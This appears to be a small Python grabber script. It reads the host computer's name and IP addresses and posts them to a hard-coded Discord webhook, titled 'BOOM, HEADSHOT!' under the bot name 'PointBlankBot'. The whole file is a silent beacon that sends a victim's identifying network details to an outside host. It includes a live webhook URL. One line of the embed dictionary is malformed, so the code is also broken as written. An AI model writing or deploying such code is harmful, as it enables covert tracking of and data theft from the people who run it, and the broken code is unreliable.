import json
import requests
import time
import socket
computer_name = socket.gethostname()
private_ip = socket.gethostbyname(socket.gethostname())
public_ip = socket.gethostbyname(socket.getfqdn())


token = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"



embed = {
    "title": "BOOM, HEADSHOT!",
    "description": computer_name,
    "color": 16711680,
    "fields": [
        {
            "name": "IP Adresses",
            "value": public_ip, private_ip,
            "inline": False
        },
        {
            "name": "Field 2",
            "value": "This is the value of field 2.",
            "inline": True
        }
    ],
    "footer": {
        "text": "This is the footer text.",
        "icon_url": "https://i.imgur.com/7lZwLKc.png"
    }
}

payload = {
    "username": "PointBlankBot",
    "embeds": [
        embed
    ]
}
headers = {
    "Content-Type": "application/json"
}

# Send the webhook
response = requests.post(token, data=json.dumps(payload), headers=headers)

# Dont fuck with anything below as it will check if this will fucking run

if response.status_code == 204:
    time.sleep(0)
else:
    print(f"Critical Error!: {response.status_code}")
